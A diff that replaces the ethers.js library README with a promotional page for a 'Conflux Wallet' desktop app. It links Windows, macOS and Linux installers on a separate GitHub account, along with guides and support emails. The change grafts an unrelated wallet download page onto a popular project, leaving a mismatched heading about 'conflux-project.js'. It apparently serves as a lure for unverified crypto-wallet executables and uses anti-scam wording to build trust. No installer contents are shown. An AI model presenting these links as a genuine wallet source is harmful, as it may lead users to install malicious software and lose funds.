@@ -1,92 +1,72 @@
-The Ethers Project
-==================
+![Conflux Wallet](assets/banner-profile.png)
 
-[![npm (tag)](https://img.shields.io/npm/v/ethers/next)](https://www.npmjs.com/package/ethers/v/next)
-[![Node.js CI](https://github.com/ethers-io/ethers.js/workflows/Node.js%20CI/badge.svg?branch=ethers-v5-beta)](https://github.com/ethers-io/ethers.js/actions?query=workflow%3A%22Node.js+CI%22)
+<h1 align="center">Conflux Wallet</h1>
 
-A complete Ethereum wallet implementation and utilities in JavaScript (and TypeScript).
+<p align="center">A wallet for the people who keep their own keys, on Windows, macOS and Linux.</p>
 
-**Features:**
+<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>
 
-- Keep your private keys in your client, **safe** and sound
-- Import and export **JSON wallets** (Geth, Parity and crowdsale)
-- Import and export BIP 39 **mnemonic phrases** (12 word backup phrases) and **HD Wallets** (English as well as Czech, French, Italian, Japanese, Korean, Simplified Chinese, Spanish, Traditional Chinese)
-- Meta-classes create JavaScript objects from any contract ABI, including **ABIv2** and **Human-Readable ABI**
-- Connect to Ethereum nodes over [JSON-RPC](https://github.com/ethereum/wiki/wiki/JSON-RPC), [INFURA](https://infura.io), [Etherscan](https://etherscan.io), [Alchemy](https://alchemyapi.io) or [MetaMask](https://metamask.io)
-- **ENS names** are first-class citizens; they can be used anywhere an Ethereum addresses can be used
-- **Tiny** (~104kb compressed; 322kb uncompressed)
-- **Modular** packages; include only what you need
-- **Complete** functionality for all your Ethereum desires
-- Extensive [documentation](https://docs.ethers.io/ethers.js/html/)
-- Large collection of **test cases** which are maintained and added to
-- Fully **TypeScript** ready, with definition files and full TypeScript source
-- **MIT License** (including ALL dependencies); completely open source to do with as you please
+---
 
+## Downloads - v0.6.14
 
-Keep Updated
-------------
+<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>
 
-For the latest news and advisories, please follow the [@ethersproject](https://twitter.com/ethersproject)
-on Twitter (low-traffic, non-marketting, important information only) as well as watch this GitHub project.
+<div align="center">
 
-For the latest changes, see the [CHANGELOG](https://github.com/ethers-io/ethers.js/blob/master/CHANGELOG.md).
+| Platform | Requirements | File |
+|---|---|---|
+| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
+| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
+| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |
 
+</div>
 
-Installing
-----------
+All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).
 
-**node.js**
+> Only download from this GitHub release page.
 
-```
-/home/ricmoo/some_project> npm install --save ethers@next
-```
+---
 
-**browser (UMD)**
+## Why Conflux Wallet on conflux-project.js
 
-```
-<script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js" type="text/javasctipt">
-</script>
-```
+If you have ever pasted a recovery phrase into a pop-up because it looked like the wallet you were using, the problem was not your caution. It was that the thing asking did not need the phrase at all, and you had no way to tell. Conflux Wallet asks for it once, at restoration, on your own machine, and there is no channel through which anyone else can ask again.
 
-**browser (ESM)**
+The application is installed software, not a web page and not an extension, so it has no session an attacker can ride and no host that can swap the build under you. You download an installer, you keep the keys, and the recovery phrase is the only thing that restores the wallet. That single boundary removes most of the ways a wallet is lost.
 
-```
-<script type="module">
-    import { ethers } from "https://cdn.ethers.io/lib/ethers-5.0.umd.min.js";
-</script>
-```
+- Keys are created on your computer and encrypted with your own password.
+- The recovery phrase is shown at creation and is the only backup that restores the accounts.
+- No server holds a key, so no support channel can reset a password for you.
+- Downloads come from the release page only, and the project never messages first.
 
+This repository is one of the four pages that make up the Conflux Wallet GitHub presence; the download, the release notes and every guide live in the repositories linked below.
 
-Documentation
--------------
+---
 
-Browse the documentation online:
+## Guides
 
-- [Getting Started](https://docs.ethers.io/)
-- [Full API Documentation](https://docs.ethers.io/)
-- [Various Ethereum Articles](https://blog.ricmoo.com/)
+<div align="center">
 
-Or browser the entire documentations as a [single page](https://docs.ethers.io/single-page/).
+| Guide | What it covers |
+|---|---|
+| [Restore Conflux Wallet From Seed Phrase](https://github.com/conflux-developments/recovery-playbook/blob/HEAD/restore-conflux-wallet-from-seed-phrase.md) | Restore Conflux Wallet From Seed Phrase: the checks, in order, for the current desktop release. |
+| [Back Up Your Conflux Wallet](https://github.com/conflux-developments/setup-handbook/blob/HEAD/back-up-conflux-wallet-recovery-phrase.md) | Back Up Your Conflux Wallet: the checks, in order, for the current desktop release. |
+| [Fake Conflux Wallet Support](https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-fake-support.md) | Fake Conflux Wallet Support: the checks, in order, for the current desktop release. |
 
+</div>
 
-Ancillary Packages
-------------------
+[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
 
-These are a number of packages not included in the umbrella `ethers` npm package, and
-additional packages are always being added. Often these packages are for specific
-use-cases, so rather than adding them to the umbrella package, they are added as
-ancillary packaged, which can be included by those who need them, while not bloating
-everyone else with packages they do not need.
+---
 
-We will keep a list of useful pacakges here.
+**Security:** download only from this release page, and never share a recovery phrase, private key, password or keystore file with anyone, including support.
 
-- `@ethersproject/experimental` ([documentation](https://docs.ethers.io))
-- `@ethersproject/cli` ([documentation](https://docs.ethers.io))
-- `@ethersproject/hardware-wallets` ([documentation](https://docs.ethers.io))
+## Support
 
+Wallet help: support@confluxwallet.net. Business and legal: office@confluxwallet.net.
 
-License
--------
+## License
 
-MIT License (including **all** dependencies).
+MIT
 
+[Main application](https://github.com/conflux-developments/conflux-desktop-wallet) - [Release v0.6.14](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14) - [Guide index](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
